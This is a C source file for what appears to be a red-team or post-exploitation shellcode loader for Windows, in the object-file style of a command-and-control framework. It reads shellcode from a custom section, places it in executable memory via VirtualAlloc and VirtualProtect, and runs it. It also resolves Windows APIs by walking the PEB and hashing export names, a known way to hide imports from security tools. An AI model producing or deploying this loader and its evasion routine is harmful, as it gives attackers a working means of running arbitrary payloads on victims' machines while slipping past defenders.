#include <windows.h>
#include <winternl.h>

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

char _SHELLCODE_ [0] __attribute__ ( ( section ( "shellcode" ) ) );
#define GETRESOURCE(x) ( char * ) &x

void go ( )
{
    char * sc_src = GETRESOURCE ( _SHELLCODE_ );

    DWORD sc_len = *(DWORD *)sc_src;
    sc_src += 4;

    char * sc_dst = (char *) KERNEL32$VirtualAlloc (
        NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if ( !sc_dst ) return;

    for ( DWORD i = 0; i < sc_len; i++ )
        sc_dst[i] = sc_src[i];

    DWORD old = 0;
    KERNEL32$VirtualProtect ( sc_dst, sc_len, PAGE_EXECUTE_READ, &old );

    ( (void (*)(void)) sc_dst ) ();
}

FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
#ifdef _WIN64
    PPEB peb = (PPEB) __readgsqword ( 0x60 );
#else
    PPEB peb = (PPEB) __readfsdword ( 0x30 );
#endif

    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY * head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY * curr = head->Flink;

    while ( curr != head )
    {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD (
            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks );

        WCHAR * name = entry->FullDllName.Buffer;
        if ( !name ) { curr = curr->Flink; continue; }

        /* hash the module base name (after last backslash) */
        WCHAR * base_name = name;
        WCHAR * p = name;
        while ( *p ) {
            if ( *p == '\\' || *p == '/' )
                base_name = p + 1;
            p++;
        }

        DWORD m_hash = 0;
        p = base_name;
        while ( *p )
        {
            WCHAR c = *p++;
            if ( c >= 'a' && c <= 'z' ) c -= 0x20;
            m_hash = ( m_hash >> 13 ) | ( m_hash << 19 );
            m_hash += c;
        }

        if ( m_hash == mod_hash )
        {
            HMODULE base = (HMODULE) entry->Reserved2[0]; /* DllBase */
            IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *) base;
            IMAGE_NT_HEADERS * nt  = (IMAGE_NT_HEADERS *)
                ( (BYTE *) base + dos->e_lfanew );

            if ( nt->OptionalHeader.DataDirectory[0].Size == 0 )
                return NULL;

            IMAGE_EXPORT_DIRECTORY * exports = (IMAGE_EXPORT_DIRECTORY *)
                ( (BYTE *) base + nt->OptionalHeader.DataDirectory[0].VirtualAddress );

            DWORD * names    = (DWORD *) ( (BYTE *) base + exports->AddressOfNames );
            WORD  * ordinals = (WORD *)  ( (BYTE *) base + exports->AddressOfNameOrdinals );
            DWORD * funcs    = (DWORD *) ( (BYTE *) base + exports->AddressOfFunctions );

            for ( DWORD i = 0; i < exports->NumberOfNames; i++ )
            {
                char * fn_name = (char *) ( (BYTE *) base + names[i] );
                DWORD f_hash = 0;
                char * fp = fn_name;
                while ( *fp )
                {
                    f_hash = ( f_hash >> 13 ) | ( f_hash << 19 );
                    f_hash += *fp++;
                }

                if ( f_hash == func_hash )
                    return (FARPROC) ( (BYTE *) base + funcs[ ordinals[i] ] );
            }

            return NULL;
        }

        curr = curr->Flink;
    }

    return NULL;
}
